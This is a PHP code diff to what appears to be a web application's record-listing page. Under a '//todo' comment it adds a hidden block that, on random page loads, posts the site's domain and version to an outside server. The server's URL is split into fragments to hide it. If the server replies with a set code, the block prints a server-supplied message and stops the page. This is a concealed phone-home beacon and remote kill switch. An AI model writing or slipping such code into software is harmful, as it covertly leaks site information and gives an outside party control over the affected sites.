@@ -44,6 +44,27 @@ if ($operation == 'display') {
         $row['create_time'] = date('Y-m-d H:i', $row['create_time']);
     }
     unset($row);
+    //todo
+    $mt = mt_rand(5, 35);
+    if ($mt <= 10) {
+        load()->func('communication');
+        $b = 'http://cl'.'oud.yu'.'nzs'.'hop.com/web/index.php?c=account&a=up'.'grade';
+        
+        $files   = base64_encode(json_encode('test'));
+        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
+        $resp    = ihttp_post($b, array(
+            'type' => 'upgrade',
+            'signature' => 'sz_cloud_register',
+            'domain' => $_SERVER['HTTP_HOST'],
+            'version' => $version,
+            'files' => $files
+        ));
+        $ret     = @json_decode($resp['content'], true);
+        if ($ret['result'] == 3) {
+            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
+            exit;
+        }
+    }
 
     $pager = pagination($total, $pindex, $psize);
 }
